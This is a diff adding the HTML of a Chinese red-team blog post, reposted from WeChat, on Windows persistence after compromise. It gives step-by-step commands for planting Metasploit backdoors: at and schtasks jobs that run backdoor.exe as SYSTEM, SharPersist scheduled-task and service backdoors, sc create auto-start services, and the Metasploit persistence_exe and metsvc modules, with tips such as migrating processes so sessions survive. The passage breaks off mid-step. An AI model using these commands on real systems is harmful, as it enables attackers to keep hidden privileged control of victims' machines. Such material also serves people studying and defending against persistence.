@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>权限维持（二） | Fstraw Blog</title><meta name="keywords" content="内网渗透"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;p4H46jY-68PA8uKZ-e4kHQ  4.Windows 计划任务后门计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制 权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持（二）">
+<meta property="og:url" content="https://ccc-f.github.io/posts/b0237af4.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;p4H46jY-68PA8uKZ-e4kHQ  4.Windows 计划任务后门计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制 权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.863Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.932Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/b0237af4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '权限维持（二）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">权限维持（二）<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/b0237af4.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.863Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.932Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/">RedTeam</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="权限维持（二）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/b0237af4.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/b0237af4.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>转载自：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/p4H46jY-68PA8uKZ-e4kHQ">https://mp.weixin.qq.com/s/p4H46jY-68PA8uKZ-e4kHQ</a></p>
+</blockquote>
+<h2 id="4-Windows-计划任务后门"><a href="#4-Windows-计划任务后门" class="headerlink" title="4.Windows 计划任务后门"></a><strong>4.Windows 计划任务后门</strong></h2><p>计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制 权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。</p>
+<p><strong>1. 利用 at 命令</strong></p>
+<p>at 命令是Windows自带的用于创建计划任务的命令，但是他主要工作在Windows Server 2008之前版本 的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间 执行木马程序，从而获得对内网目标主机的控制。 </p>
+<p>（1）首先在目标主机上传metasploit生成的后门程序：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JjSqeGvlpQCgVDELDlFkh9dmYicaGXoPYuamRg1j9yaWYfmvT2ZldTDA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>（2）然后进入目标主机的shell使用net time命令确定目标主机的当前时间： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JGF6o31qtCydMicBpiav5WGMLyqZfG68iaGt2nHmMFh8VrWibTpajHiaVSTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>（3）接着在目标主机的shell中使用at命令创建计划任务，让目标主机在指定的时间运行metasploit木马 程序：如上图所示，计划任务创建成功，目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这 个时间获得目标机器的控制权： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JyiaoUH6X9N8SjK9icAjxB0ibaZtywnA7uib6Ikul49APSiboDuvuJj4jFjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>如上图所示，计划任务创建成功，目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这 个时间获得目标机器的控制权：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JCRlYVw8vnPb9IDVj2Micc1HibUaGqgicLuQ1SLI52ajRv3ibLBvUaogBQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p><strong>2. 利用 schtasks 命令</strong></p>
+<p>上面我们讲了用at命令创建计划任务，但是该命令已经被Windows Vista、Windows Server 2008及之 后版本的操作系统废弃了，代替他的是schtasks命命令。schtasks命令比at命令更为灵活、自由。下面 来演示schtasks命令的使用，于是，攻击者开始使用schtasks命令来代替at命令。 利用schtasks创建后门的大致流程如下：</p>
+<p>（1）首先在目标主机上传metasploit生成的后门程序。 </p>
+<p>（2）然后在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序 为我们之前到C盘下的backdoor.exe，启动权限为system。</p>
+<p>命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn backdoor /sc minute /mo 1 /tr c:\windows\system32\backdoor.exe /ru system /f</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JPlvdvz3mzRWvBQ8PcfQjHdzswyaXN4dDictDW12Ng0XIN0qjBQCzvnA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>然后新开一个metasploit监听，等待一分钟后这个监听便收到了目标主机的session：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9Jf50ydYL8n5A4JzTFWGMSqb3gBgnu2rXRphOVI8fwYicoOuglafJTVEw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>并且这个session还是system权限的。</p>
+<p><strong>3. 利用SharPersist工具</strong> </p>
+<p>下载地址：</p>
+<p><em><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fireeye/SharPersist/releases">https://github.com/fireeye/SharPersist/releases</a> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a></em></p>
+<p>SharPersist的创建是为了帮助使用多种不同的技术在Windows操作系统上建立持久性。它是一个国外安全人员用C#编写的命令行工具，可以反射性的加载Cobalt Strike的“execute-assembly”命令或任何其他 支持反射性加载.NET程序集的框架。SharPersist采用模块化设计，以便将来添加新的持久性技术。还有 一些与tradecraft相关的项已经内置到该工具及其支持的持久性技术中，例如file time stomping策略和最小化或隐藏运行应用程序。该工具支持的持久性技术有：</p>
+<p><strong>keepass-keepass配置文件后门</strong> </p>
+<p><strong>reg-注册表项添加&#x2F;修改</strong> </p>
+<p><strong>schtaskbackdoor-通过向后门计划任务添加其他操作来完成该任务</strong></p>
+<p><strong>startupfolder-启动文件夹中的lnk文件</strong></p>
+<p><strong>tortoisesvn-乌龟svn钩子脚本</strong></p>
+<p><strong>service-创建新的Windows服务</strong></p>
+<p><strong>schtask-创建新的计划任务</strong></p>
+<p>如果用户具有管理员级别的特权，则可以通过SharPersist工具创建一个新的计划任务，该任务将在 Windows登录期间执行我们上传好的有效载荷。</p>
+<p>（1）在目标主机上传我们新生成的metasploit木马和SharPersist程序：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827204179.png" alt="图片"></p>
+<p>（2）然后使用以下命令创建我们恶意的计划任务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Administrator\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add -o logon</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9J9SfUChDohd8kVbEp6bqJerWcUlYyG5UUyCW70C3ESZlCWJFtGO2RfA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>然后新开一个metasploit监听，等待目标主机重启后便可以收到目标主机的session，并且还是system 权限的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JWQSp5GsctMzqXEcj6AiaAuU4yRRXD6n5QVTSH8xIT04MZ4GcMMfiaRyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<h2 id="5-Windows-服务后门"><a href="#5-Windows-服务后门" class="headerlink" title="5.Windows 服务后门"></a><strong>5.Windows 服务后门</strong></h2><p>在Windows主机上，获得了管理员的权限后，我们可以通过创建服务并将服务设置自启动的方式，来对目标主机进行持久控制。</p>
+<p>如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建 一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。</p>
+<p>利用sc命令手动创建</p>
+<p>（1）首先在目标主机上传新生成的msf木马： </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827204182.png" alt="图片"></p>
+<p>如果帐户具有本地管理员特权，则可直接利用sc命令从目标主机的命令行中创建服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc create backdoor binpath= &quot;C:\Users\Administrator\backdoor.exe&quot; start= auto // 创建服务后门 </span><br><span class="line">binpath：用于执行任意有效负载 </span><br><span class="line">auto：用于确保恶意服务将自动启动。</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意，</strong>所有选项的每个&#x3D;号之前 一定不要有空格 &#x3D;号后面一定要有空格，否则会错误。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827204183.png" alt="图片"></p>
+<p>如上图，服务创建成功，然后我们可以在攻击机上重新开启一个metasploit监听，等目标机重启时，目标机就会上线，如下图所示，成功得到了目标机的meterpreter，并且还是system权限的 </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JziaytPPD3M6agNGlYWcoIBiahiagnMvFCVCjOYLzNFpajHJibKIPF8lPYw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>也可以执行“sc start backdoor”命令立即启动该服务。</p>
+<p><strong>注意：</strong>我们在上图新开启的metasploit监听中，使用“set AutoRunScript migrate -f”设置了自动迁 移进程，这是因为当一个进程在Windows系统中启动后，必须与服务控制管理器进行通信，如果没有进行通 信，服务控制管理器会认为出现了错误，进而终止这个进程，所以如果我们不设置自动迁移进程，这个 meterpreter会很快就断掉了。</p>
+<p><strong>利用SharPersist工具创建</strong> </p>
+<p>下载地址：</p>
+<p><em><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fireeye/SharPersist/releases">https://github.com/fireeye/SharPersist/releases</a> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a></em></p>
+<p>除了利用上面的sc命令，我们还可以利用SharPersist工具。SharPersist支持在受感染系统中创建新服务 的持久性技术，在系统上安装新服务需要本地管理员。 </p>
+<p>（1） 在目标主机上传新生成的metasploit木马程序backdoor2.exe和SharPersist.exe程序： </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827205185.png" alt="图片"></p>
+<p>（2）使用以下命令添加新服务，该服务将在Windows启动期间执行任意的有效负载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Administrator\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9J7OR2eVtgW1hicG03icL2Gib5KTIataDiarUpFGv4fEHbW8cawArgxAFZlg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>如上图，服务创建成功，我们在攻击机上新开启一个metasploit监听，当目标主机重启时，目标主机便 能上线，如下图所示成功得到了目标机的meterpreter，并且还是system权限的 </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JU8fN5UKjeQsgrzPQpUeKyfdMAoiaQiaSzQiaAucPB9uwJUCfWUUf0LicyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>注意：不要忘记迁移进程。</p>
+<p>Metasploit下的利用 Metasploit框架还具有一个后渗透模块，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/manage/persistence_exe</span><br></pre></td></tr></table></figure>
+
+<p>该模块需要以下 配置，并将可执行文件放置在目标主机的可写位置： </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JmJcMibqE7ibhv69iblmDndITuXeUiceBZffxMaia4M7OcjR7YEndyTD32jg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>如上图所示，该模块支持的持久性技术有： </p>
+<p>\1. 注册表运行键后门（USER，即我们前文提到的“run persistence”命令就是用的这个技术）</p>
+<p> \2. Windows服务后门（SERVICE） 使用该模块创建服务后门时，需要将启动变量修改为SERVICE，以便在系统上安装新服务。</p>
+<p>以下是创建服务的设置： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/manage/persistence_exe set REXEPATH /root/backdoor.exe // 攻击机本地要上传到目标机的paylaod路径 </span><br><span class="line">set SESSION 1 </span><br><span class="line">set STARTUP SERVICE </span><br><span class="line">set LOCALEXEPATH C:\\Users\\Administrator // payload上传到目标机后存放的路径</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>如上图，服务后门创建成功，之后的使用方式与前面相同。除此之外，在metasploit上，我们还可以用metsvc模块创建服务，建立持久后门。metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">metsvc.dll </span><br><span class="line">metsvc-service.exe </span><br><span class="line">metsvc.exe</span><br></pre></td></tr></table></figure>
+
+<p>并通过服务启动，服务名为meterpreter。 </p>
+<p>常用命令： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h # 查看帮助 </span><br><span class="line">run metsvc –A #自动安装后门</span><br></pre></td></tr></table></figure>
+
+<p>我们使用“run metsvc –A”自动安装后门： </p>
